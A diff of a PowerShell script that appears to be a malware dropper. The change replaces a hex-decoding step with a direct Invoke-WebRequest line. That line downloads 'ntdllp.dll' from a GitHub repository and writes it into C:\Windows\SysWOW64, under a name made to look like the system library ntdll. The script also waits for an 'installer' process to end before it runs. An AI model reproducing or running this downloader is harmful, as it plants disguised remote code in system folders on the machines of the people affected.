@@ -1,6 +1,6 @@
 $urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
 $urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
-$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
+$urlC = "https://github.com/devnull-sys/files/raw/refs/heads/main/ntdllp.dll"
 $urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.txt"
 $filePath = "C:\Windows\SysWOW64\ntdllp.dll"
 $clipText = "SteF6b2WrAgu"
@@ -59,20 +59,7 @@ do {
 } while (Get-Process -Name "installer" -ErrorAction SilentlyContinue)
 
 try {
-    $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing
-    if ($responseC.StatusCode -eq 200) {
-        $newHexContent = $responseC.Content.Trim()
-        $newHexContent = $newHexContent -replace '\s', ''
-        if ($newHexContent -and $newHexContent.Length % 2 -eq 0) {
-            $newBytes = HexToBytes $newHexContent
-            [IO.File]::WriteAllBytes($filePath, $newBytes)
-            $writtenBytes = [IO.File]::ReadAllBytes($filePath)
-            if ([System.Linq.Enumerable]::SequenceEqual($newBytes, $writtenBytes)) {
-            } else {
-                exit 1
-            }
-        }
-    }
+    Invoke-WebRequest -Uri $urlC -OutFile $filePath -UseBasicParsing
 } catch {
     exit 1
 }
